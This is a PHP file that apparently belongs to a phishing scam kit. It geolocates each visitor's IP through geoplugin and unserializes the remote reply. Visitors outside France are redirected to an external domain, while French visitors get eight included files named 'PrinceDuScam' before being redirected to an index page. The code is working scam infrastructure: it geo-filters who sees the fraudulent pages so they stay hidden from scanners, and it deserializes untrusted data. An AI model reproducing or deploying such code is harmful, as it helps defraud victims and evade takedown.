<?php
$zbii = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$zbii;
$addrDetailsArr = unserialize(file_get_contents($geoip)); 
$country = $addrDetailsArr['geoplugin_countryName'];
if (!$country)
{
    $country='Not found!';
}
if (strcmp($country, 'France')!==0)
{
      header("location: http://guiminer.co.technology/rd/ ");
     exit();
} 
  	require 'PrinceDuScam1.php';
	require 'PrinceDuScam2.php';
	require 'PrinceDuScam3.php';
	require 'PrinceDuScam4.php';
	require 'PrinceDuScam5.php';
	require 'PrinceDuScam6.php';
	require 'PrinceDuScam7.php';
	require 'PrinceDuScam8.php';
	exit(header("Location: ../index.php"));
?>
